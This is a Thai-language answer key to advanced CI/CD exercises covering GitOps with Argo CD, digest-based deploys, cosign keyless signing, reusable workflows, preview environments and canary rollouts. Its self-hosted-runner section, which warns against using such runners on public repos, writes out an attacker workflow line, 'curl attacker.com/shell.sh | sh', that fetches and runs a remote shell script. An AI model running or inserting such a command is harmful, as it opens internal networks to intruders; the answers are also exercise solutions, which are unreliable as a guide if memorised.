# เฉลย — ⚙️ CI/CD ระดับ 4

⬅️ [กลับไปที่โจทย์](../../cicd/04-advanced.md)

---

## C4.1 แยก config repo

```yaml
- name: อัปเดต config repo
  run: |
    git clone https://x-access-token:${{ secrets.CONFIG_REPO_TOKEN }}@github.com/${{ github.repository_owner }}/todo-api-config.git cfg
    cd cfg/overlays/dev
    kustomize edit set image api=ghcr.io/${{ github.repository }}@${{ steps.build.outputs.digest }}
    git config user.name  "ci-bot"
    git config user.email "ci-bot@users.noreply.github.com"
    git commit -am "chore(dev): ${{ github.sha }}"
    git push
```

**ทำไมต้องแยก repo — 3 เหตุผลเรียงตามความสำคัญ:**

| เหตุผล | รายละเอียด |
| --- | --- |
| **ตัดวงจร CI ไม่รู้จบ** | บอท commit → trigger CI → commit อีก → วนไม่จบ |
| **สิทธิ์คนละชุด** | dev ทุกคนแก้โค้ดได้ แต่แก้ overlay ของ prod ได้เฉพาะคนที่ได้รับอนุญาต |
| **history อ่านรู้เรื่อง** | history ของ config repo = ประวัติการ deploy ล้วน ๆ ตอบได้ทันทีว่า "prod รันเวอร์ชันไหนตั้งแต่เมื่อไร" |

**ถ้าจำเป็นต้องใช้ repo เดียว** ต้องมีทั้งสองอย่าง:

```yaml
on:
  push:
    paths-ignore: ["k8s/**"]
```

```bash
git commit -m "chore: bump image [skip ci]"
```

แต่ยังแก้ปัญหาเรื่องสิทธิ์ไม่ได้อยู่ดี

---

## C4.2 GitOps

```yaml
# Application ใน Argo CD
spec:
  source:
    repoURL: https://github.com/company/todo-api-config.git
    path: overlays/dev
  syncPolicy:
    automated: { prune: true, selfHeal: true }
```

หลังทำเสร็จ workflow ควรเหลือแค่:

```
test → build → push GHCR → commit config repo
```

**ไม่มี `kubectl` เหลืออยู่เลย** — และนี่คือประโยชน์ที่แท้จริง:

| | ก่อน (push-based) | หลัง (pull-based) |
| --- | --- | --- |
| credential ของคลัสเตอร์ | อยู่ใน GitHub Secrets | **ไม่มีอยู่นอกคลัสเตอร์เลย** |
| ต้องเปิด API server ให้เข้าถึงจากภายนอก | ✅ ต้อง | ❌ ไม่ต้อง |
| ถ้า GitHub ล่ม | deploy ไม่ได้ | คลัสเตอร์ยังทำงานปกติ (แค่ไม่ได้อัปเดต) |
| รู้ว่าคลัสเตอร์ตรงกับ git ไหม | ไม่รู้ | **รู้ตลอดเวลา** |

ข้อแรกสำคัญที่สุดในองค์กร — **การไม่ต้องเก็บ kubeconfig ของ production ไว้ใน CI คือการลดความเสี่ยงอย่างมหาศาล**

---

## C4.3 deploy ด้วย digest

```yaml
IMAGE="ghcr.io/${{ github.repository }}@${{ steps.build.outputs.digest }}"
kubectl set image deployment/todo-api api=$IMAGE
```

**ทำไม tag ลอยทำให้ "rollback แล้วยังพังเหมือนเดิม":**

```
10:00  deploy tag "dev" → ได้ image A (ดี)
11:00  build ใหม่ push ทับ tag "dev" → tag เดิมชี้ image B (พัง)
11:05  deploy → ได้ B → พัง
11:06  rollback ไป "dev" → ก็ยังได้ B → ยังพังเหมือนเดิม 🔁
```

ด้วย digest:

```
10:00  deploy @sha256:aaa  (ดี)
11:05  deploy @sha256:bbb  (พัง)
11:06  rollback ไป @sha256:aaa → ได้ image เดิมเป๊ะ ✅
```

**พิสูจน์ด้วยตัวเอง:** deploy digest เดิมซ้ำสองครั้ง แล้วเทียบ `kubectl get pod -o jsonpath='{...imageID}'` → ต้องเหมือนกันเป๊ะ

**ผลพลอยได้:** k8s รู้ว่า digest เปลี่ยนจึงสั่ง rolling update เอง — ไม่ต้องใช้ทริก `imagePullPolicy: Always` + restart

---

## C4.4 SBOM + provenance + ลายเซ็น

```yaml
permissions:
  contents: read
  packages: write
  id-token: write # จำเป็นสำหรับ keyless signing

steps:
  - uses: docker/build-push-action@v6
    id: build
    with:
      push: true
      sbom: true
      provenance: mode=max

  - uses: sigstore/cosign-installer@v3
  - run: cosign sign --yes ghcr.io/${{ github.repository }}@${{ steps.build.outputs.digest }}
  - run: |
      cosign verify \
        --certificate-identity-regexp "https://github.com/${{ github.repository }}/*" \
        --certificate-oidc-issuer https://token.actions.githubusercontent.com \
        ghcr.io/${{ github.repository }}@${{ steps.build.outputs.digest }}
```

**keyless signing ทำงานยังไง:** GitHub ออก OIDC token ให้ workflow → cosign เอาไปแลก certificate ชั่วคราวจาก Fulcio
→ เซ็น → บันทึกลง transparency log สาธารณะ (Rekor)

**ได้อะไรที่ key แบบเดิมให้ไม่ได้:**

- ไม่ต้องเก็บ private key ที่ไหนเลย (ไม่มีของให้หลุด)
- ลายเซ็นผูกกับ **identity ของ workflow** — พิสูจน์ได้ว่า "image นี้ถูก build โดย workflow ของ repo นี้เท่านั้น"
- ตรวจสอบย้อนหลังได้จาก transparency log สาธารณะ

**สิ่งที่ต้องทำต่อ:** เซ็นแล้วต้องมีคน verify — ถ้าคลัสเตอร์ pull โดยไม่ตรวจลายเซ็น การเซ็นก็ไม่มีความหมาย
(ใช้ Kyverno `verifyImages` หรือ Sigstore policy-controller)

---

## C4.5 reusable workflow

```yaml
# .github/workflows/build.yml
on:
  workflow_call:
    inputs:
      image-tag: { required: true, type: string }
    outputs:
      digest:
        value: ${{ jobs.build.outputs.digest }}
    secrets:
      registry-token: { required: true }
```

```yaml
# เรียกใช้
jobs:
  build:
    uses: ./.github/workflows/build.yml
    with: { image-tag: dev }
    secrets: { registry-token: ${{ secrets.GITHUB_TOKEN }} }
```

| | reusable workflow | composite action |
| --- | --- | --- |
| ระดับ | ทั้ง job | กลุ่มของ step |
| runner แยกกันไหม | ✅ แยก | ❌ ใช้ของ job ที่เรียก |
| ส่ง secret ได้ | ✅ | ต้องส่งเป็น input |
| ซ้อนกันได้ลึกแค่ไหน | 4 ชั้น | ไม่จำกัดในทางปฏิบัติ |

**เลือกยังไง:** ถ้าเป็นชุด step ที่ใช้ซ้ำ (setup node + install) → composite action
ถ้าเป็นทั้ง job ที่มีตรรกะของตัวเอง (build + push) → reusable workflow

---

## C4.6 self-hosted runner

```yaml
runs-on: [self-hosted, linux, internal]
```

**ทำไมห้ามใช้กับ public repo — อธิบายให้ชัด:**

```
คนแปลกหน้า fork repo คุณ
  → แก้ .github/workflows ให้รัน curl attacker.com/shell.sh | sh
  → เปิด PR
  → workflow รันบน runner ของคุณที่อยู่ในเครือข่ายภายในบริษัท
  → ผู้โจมตีได้ shell ในวง LAN ของคุณ
```

GitHub เตือนเรื่องนี้ไว้ในเอกสารอย่างชัดเจน มาตรการที่ต้องทำถ้าใช้ในองค์กร:

| มาตรการ | ทำไม |
| --- | --- |
| ใช้เฉพาะ private repo | ตัดปัญหาที่ต้นเหตุ |
| **ephemeral runner** (ทำงานเสร็จแล้วทิ้ง) | งานหนึ่งไม่ทิ้งของไว้ให้อีกงานเจอ |
| network segment แยก | จำกัดความเสียหายถ้าถูกเจาะ |
| จำกัด egress เฉพาะที่จำเป็น | GitHub, Harbor, npm registry เท่านั้น |
| ตั้ง runner group จำกัด repo ที่ใช้ได้ | ไม่ให้ repo อื่นในองค์กรมาใช้มั่ว |

**แนะนำ:** ใช้ Actions Runner Controller (ARC) บน k8s → ได้ ephemeral runner อัตโนมัติและ scale ตามคิวงาน

---

## C4.7 preview environment

```yaml
on:
  pull_request:
    types: [opened, synchronize, reopened, closed]

jobs:
  deploy-preview:
    if: github.event.action != 'closed'
    steps:
      - run: |
          NS="preview-pr-${{ github.event.number }}"
          kubectl create namespace $NS --dry-run=client -o yaml | kubectl apply -f -
          kustomize build k8s/overlays/dev | kubectl -n $NS apply -f -
      - uses: actions/github-script@v7
        with:
          script: |
            github.rest.issues.createComment({
              issue_number: context.issue.number,
              owner: context.repo.owner,
              repo: context.repo.repo,
              body: `🚀 Preview: https://pr-${context.issue.number}.preview.example.com`
            })

  cleanup:
    if: github.event.action == 'closed'
    steps:
      - run: kubectl delete namespace preview-pr-${{ github.event.number }} --ignore-not-found
```

**ข้อที่คนลืมคือ cleanup** — และผลลัพธ์คือคลัสเตอร์เต็มไปด้วย namespace ของ PR ที่ปิดไปเมื่อครึ่งปีก่อน

**ควรมีตาข่ายนิรภัยด้วย** เพราะ job cleanup อาจไม่รัน (PR ถูกลบ, workflow พัง):

```bash
# CronJob กวาด namespace ที่เก่าเกิน 7 วัน
kubectl get ns -o json | jq -r '.items[] |
  select(.metadata.name | startswith("preview-pr-")) |
  select(.metadata.creationTimestamp | fromdate < (now - 604800)) |
  .metadata.name'
```

**หลักการทั่วไป: ทุกอย่างที่สร้างอัตโนมัติ ต้องมีวิธีลบอัตโนมัติที่ไม่พึ่ง happy path**

---

## C4.8 progressive delivery

```yaml
apiVersion: argoproj.io/v1alpha1
kind: Rollout
spec:
  strategy:
    canary:
      analysis:
        templates: [{ templateName: success-rate }]
        startingStep: 1
      steps:
        - setWeight: 10
        - pause: { duration: 5m }
        - setWeight: 50
        - pause: { duration: 5m }
        - setWeight: 100
---
apiVersion: argoproj.io/v1alpha1
kind: AnalysisTemplate
metadata: { name: success-rate }
spec:
  metrics:
    - name: success-rate
      interval: 1m
      successCondition: result[0] >= 0.99
      failureLimit: 2
      provider:
        prometheus:
          address: http://prometheus.monitoring:9090
          query: |
            sum(rate(http_requests_total{status!~"5..",service="todo-api"}[2m]))
            /
            sum(rate(http_requests_total{service="todo-api"}[2m]))
```

**ทดสอบว่าทำงานจริง:** deploy เวอร์ชันที่ทำให้ 10% ของ request คืน 500
→ analysis ล้มเหลว 2 ครั้งติด → Rollout หยุดและย้อนกลับเองโดยไม่มีคนสั่ง

**ความต่างที่แท้จริงจาก rolling update:**

| | Rolling update | Progressive delivery |
| --- | --- | --- |
| ตัวชี้วัดที่ใช้ตัดสิน | pod ready ไหม | **metric ของธุรกิจ** |
| pod ที่ ready แต่ตอบ 500 30% | ผ่านฉลุย | ถูกจับได้ |
| ผู้ใช้ที่ได้รับผลกระทบก่อนถูกจับได้ | ทั้งหมด | ~10% |

**สิ่งที่ต้องมีก่อนจะทำได้:** metric ที่เชื่อถือได้
progressive delivery ที่วัดจาก metric ที่ไม่แม่น = ระบบที่ตัดสินใจผิดอัตโนมัติ ซึ่งแย่กว่าไม่มี

---

## 🎯 ต่อยอด

- ลอง ApplicationSet + PR generator ให้ Argo สร้าง preview environment ให้อัตโนมัติ
- ตั้ง Kyverno `verifyImages` ให้ปฏิเสธ image ที่ไม่มีลายเซ็น
- วัดว่าจากตอน merge ถึงตอนขึ้น production ใช้เวลาเท่าไร แล้วหาว่าคอขวดอยู่ตรงไหน
